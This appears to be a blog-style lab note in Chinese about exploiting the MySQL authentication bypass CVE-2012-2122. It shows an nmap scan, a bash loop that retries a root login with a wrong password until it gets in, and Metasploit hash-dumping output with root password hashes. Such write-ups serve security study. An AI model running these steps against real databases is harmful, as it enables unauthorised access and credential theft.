---
title: MySQL
category:
- [Kali, Exploit]
  
tags:
  - null
date: 2020-12-04 20:23:41
top:
updated:
---

## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 3306 -sC    192.168.79.207                                                           
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:28 CST
Nmap scan report for 192.168.79.207
Host is up (0.00013s latency).

PORT     STATE  SERVICE VERSION
3306/tcp open   mysql   MySQL 5.5.23
| mysql-info:
|   Protocol: 10
|   Version: 5.5.23
|   Thread ID: 2
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, SupportsCompression, LongPassword, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: <~'EdI|Z*b0d,Ly>hpy2
|_  Auth Plugin Name: mysql_native_password
3306/udp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```


## MySQL认证绕过漏洞 CVE-2012-2122
  当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。  
也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。


### bash脚本利用

> 在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录
```
 for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done  

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 603
Server version: 5.5.23 Source distribution

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

## MSF利用
> mysql_authbypass_hashdump
```
$ msfconsole
msf > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf  auxiliary(mysql_authbypass_hashdump) > set USERNAME root
msf  auxiliary(mysql_authbypass_hashdump) > set RHOSTS 127.0.0.1
msf  auxiliary(mysql_authbypass_hashdump) > run
 
[+] 127.0.0.1:3306 The server allows logins, proceeding with bypass test
[*] 127.0.0.1:3306 Authentication bypass is 10% complete
[*] 127.0.0.1:3306 Authentication bypass is 20% complete
[*] 127.0.0.1:3306 Successfully bypassed authentication after 205 attempts
[+] 127.0.0.1:3306 Successful exploited the authentication bypass flaw, dumping hashes...
[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D
[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D
[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D
[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D
[+] 127.0.0.1:3306 Saving HashString as Loot: debian-sys-maint:*C59FFB311C358B4EFD4F0B82D9A03CBD77DC7C89
[*] 127.0.0.1:3306 Hash Table has been saved: 20120611013537_default_127.0.0.1_mysql.hashes_889573.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
